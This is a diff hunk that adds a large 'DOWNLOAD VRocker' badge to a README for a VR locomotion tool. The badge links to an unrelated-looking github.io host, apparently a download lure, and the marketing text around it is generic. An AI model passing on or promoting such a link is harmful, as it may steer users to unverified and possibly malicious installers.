@@ -30,6 +30,12 @@ VRocker translates physical rocking or shifting your weight into VR movement, pr
 
 Whether you're a newcomer or a veteran, VRocker provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download VRocker](https://img.shields.io/badge/⬇_DOWNLOAD_VRocker-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
